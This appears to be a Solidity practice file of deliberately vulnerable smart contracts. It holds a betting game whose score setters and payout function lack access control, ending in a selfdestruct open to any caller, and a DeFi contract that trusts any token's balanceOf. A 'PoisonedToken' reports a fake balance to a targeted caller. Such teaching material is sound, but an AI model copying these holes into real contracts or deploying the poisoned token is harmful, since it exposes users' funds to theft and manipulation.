pragma solidity >=0.8.0 <0.9.0;

import "hardhat/console.sol";

contract Vuln1 {
    uint16[2] public scores;
    address public player1;
    address public player2;
    uint256 bet;
    
    function payForMatch() external {
        require(scores[0] > 0, "first player should commit");
        require(scores[1] > 0, "second player should commit");
        
        console.log("Total contract balance: %s", address(this).balance);
        
        // NOT WORKING
        // uint256 player1pay = scores[0] / (scores[0] + scores[1]) * address(this).balance;
        // uint256 player2pay = scores[1] / (scores[0] + scores[1]) * address(this).balance;

        // WORKING
        uint256 player1pay = scores[0] * address(this).balance / (scores[0] + scores[1]);
        uint256 player2pay = address(this).balance * scores[1] / (scores[0] + scores[1]);
        
        console.log("scores0: %s of %s, player1pay: %s", scores[0], scores[0] + scores[1], player1pay);
        console.log("scores1: %s of %s, player2pay: %s", scores[1], scores[0] + scores[1], player2pay);
        
        payable(player1).transfer(player1pay);
        payable(player2).transfer(player2pay);
        
        selfdestruct(payable(msg.sender));
    }

    function registerPlayer1() external payable {
        require(msg.value > 0, "must make a bet");
        bet = msg.value;
        player1 = msg.sender;
    }
    
    function registerPlayer2() external payable {
        require(msg.value == bet, "must make a bet equal to player1");
        player2 = msg.sender;
    }
    
    function scorePlayer1(uint16 score) external { scores[0] = score; }
    function scorePlayer2(uint16 score) external { scores[1] = score; }
}



contract CoolDeFiProtocolWithAnyToken {
    address public userToken;
    address owner;
    mapping (address => uint256) finalBalances;

    constructor() {
        owner = msg.sender;
    }

    function setUserToken(address _token) external {
        require(msg.sender == owner);
        userToken = _token;
    }
    
    function balanceOf(address _who) external view returns(uint256) {
        return finalBalances[_who];
    }

    function coolDeFiOperation() external {
        require (userToken != address(0), "no token addres set");
        // do cool stuff
        // need to analyse final token balance of user
        finalBalances[msg.sender] = getExternalTokenBalance(msg.sender);
    }

    function getExternalTokenBalance(address _who) internal returns(uint256) {
        bytes4 SELECTOR = bytes4(keccak256(bytes('balanceOf(address)')));
        bytes memory data;
        (, data) = userToken.call(abi.encodeWithSelector(SELECTOR, _who));
        return abi.decode(data, (uint256));
    }
}


contract PoisonedToken {
    address fuckedAddr;
    mapping (address => uint256) balances;
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function getsender() external view returns(address) {
        return msg.sender;
    }
    
    function setFuckedAddr(address _addr) external {
        fuckedAddr = _addr;
    }
    function mint(address _who, uint256 _amount) external {
        require(msg.sender == owner);
        balances[_who] += _amount;
    }

    function balanceOf(address _who) external view returns(uint256) {
        if (msg.sender == fuckedAddr) {
            return 666;
        }
        return balances[_who];
    }
}


